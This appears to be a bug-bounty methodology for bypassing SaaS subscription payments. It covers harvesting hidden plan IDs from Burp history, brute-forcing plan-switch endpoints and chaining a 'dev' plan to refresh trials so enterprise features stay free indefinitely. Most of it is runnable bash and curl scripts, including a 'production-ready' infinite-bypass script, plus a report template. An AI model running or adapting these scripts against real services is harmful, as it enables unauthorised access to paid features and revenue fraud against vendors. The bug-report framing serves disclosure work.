#  Subscription Bypass Methodology


## 1. Account Setup & Initial Recon

```bash
# Create account with temp mail
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@temp-mail.org","password":"Test123!"}' | jq .

# Check initial plan
curl -X GET "https://target.com/api/user/profile" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq '.plan'
```

**Goal:** Confirm Starter plan + 14-day trial start date.

## 2. Map Feature Gates & Upgrade Triggers

- Browse **ALL** features looking for "Upgrade to Enterprise" prompts
- Intercept upgrade button requests in Burp Suite
- Focus on **direct plan-switch APIs** (no payment flow)

```bash
# Test captured upgrade endpoint
curl -X POST "https://target.com/api/plan/switch" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_id": "rec_plans_v4_enterprise_an"}' | jq .
```

## 3. Harvest ALL Plan IDs (Burp History Goldmine)

```bash
# Export Burp history, grep for plan patterns
grep -i "rec_plans\|plan_id" burp_history.json | \
  grep -o 'rec_plans[^",}]*' | sort -u > all_plans.txt

# Manual: Find plans API response
curl -X GET "https://target.com/api/plans" | jq '.[] | .id'
```

**Expected output:** 20-50 hidden plans (`starter`, `enterprise`, `dev`, `internal_*`)

## 4. Trial-Period Plan Switching Matrix

```bash
#!/bin/bash
while read plan; do
  echo "[+] Testing $plan"
  curl -s -X POST "https://target.com/api/plan/switch" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"plan_id\":\"$plan\"}" | \
    jq '.plan_id, .status' > "trial_plans/$plan.json"
done < all_plans.txt
```

## 5. Wait for Trial Expiration (CRITICAL)

- Create 3-5 accounts or wait 14+ days
- Verify `expired` status:

```bash
curl -X GET "https://target.com/api/user/profile" | jq '.plan.status'  # "expired"
```

## 6. Post-Trial Plan Switching Matrix

```bash
#!/bin/bash
# plans_matrix.sh
BASE="https://target.com/api/plan/switch"
TOKEN="EXPIRED_TOKEN"

plans=("rec_plans_v4_starter_an" "rec_plans_v4_enterprise_an" "rec_plans_v4_dev")

for from_plan in "${plans[@]}"; do
  for to_plan in "${plans[@]}"; do
    echo "[$from_plan → $to_plan]"
    curl -s -X POST "$BASE" \
      -H "Authorization: Bearer $TOKEN" \
      -d "{\"plan_id\":\"$to_plan\"}" | jq .
    
    # Test premium feature access
    curl -s "https://target.com/api/premium-feature" -H "Authorization: Bearer $TOKEN" | jq .
  done
done
```

## 7. Hunt Trial Refreshers (The Money Shot)

**Test sequence for each hidden plan:**

```bash
# 1. Switch to suspect plan (dev/internal often refreshers)
curl -X POST "$BASE" -d '{"plan_id": "rec_plans_v4_dev"}'

# 2. Check NEW trial activation
curl -X GET "https://target.com/api/user/profile" | jq '.trial.ends'

# 3. Switch to premium plan (inherits trial)
curl -X POST "$BASE" -d '{"plan_id": "rec_plans_v4_enterprise_an"}'

# 4. Verify money gates bypassed
curl -X POST "https://target.com/api/project/download" -d '{"project_id": 123}'
curl -X POST "https://target.com/api/project/send" -d '{"project_id": 123}'
```

## 8. Infinite Bypass PoC Script

```bash
#!/bin/bash
# infinite_bypass.sh - Production-ready demo

echo "🔓 Expired account → Unlimited Enterprise"
echo "1. dev plan (trial refresher)"
curl -X POST "$BASE" -d '{"plan_id": "rec_plans_v4_dev"}' | jq .

sleep 2
echo "2. Enterprise (inherits trial)"
curl -X POST "$BASE" -d '{"plan_id": "rec_plans_v4_enterprise_an"}' | jq .

echo "3. FREE premium actions"
curl -X POST "https://target.com/api/project/download" -d '{"project_id": 123}' | jq .
curl -X POST "https://target.com/api/project/send" -d '{"project_id": 123}' | jq .

echo "✅ Repeat infinitely. Business model destroyed."
```

## 9. Impact Validation Checklist

- [ ] Account shows `expired` status
- [ ] dev plan grants NEW 14-day trial
- [ ] Enterprise inherits active trial
- [ ] Send project works (normally $)
- [ ] Download project works (normally $)
- [ ] All features unlocked temporarily
- [ ] Can repeat after 14 days

## Pro Hunting Tips

```
1. Burp History = 80% of discovery (grep "rec_plans")
2. ALWAYS wait for trial expiration (pre-trial = WAF)
3. dev/internal plans = trial refreshers 90% of time
4. Test Send/Download (features alone = low impact)
5. Matrix test ALL combinations systematically
6. Video record the full dev→enterprise→download flow
```

## Report Template

```
Title: Infinite Enterprise Trial via Plan Chaining
Severity: High (Business Logic)
Impact: Complete subscription revenue bypass

Steps:
1. Wait for trial expiration
2. dev plan → new 14-day trial
3. Enterprise plan → inherits trial
4. Send/Download FREE forever

PoC: [video + script]
```

***

